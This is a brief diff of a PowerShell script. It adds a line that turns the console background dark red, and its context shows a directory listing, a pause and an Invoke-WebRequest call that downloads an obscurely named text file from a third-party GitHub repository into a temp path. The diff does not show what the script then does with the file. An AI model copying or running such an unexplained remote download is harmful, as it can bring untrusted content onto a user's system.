@@ -26,6 +26,8 @@ tree /A /F
 
 Start-Sleep -Seconds 2
 
+$host.UI.RawUI.BackgroundColor = "DarkRed"
+
 # ดาวน์โหลดไฟล์จาก URL และบันทึกไปที่ temp/t.txt
 Invoke-WebRequest -Uri "https://github.com/nickfour/Service7/raw/main/zpcypx.txt" -OutFile $destinationPath
 
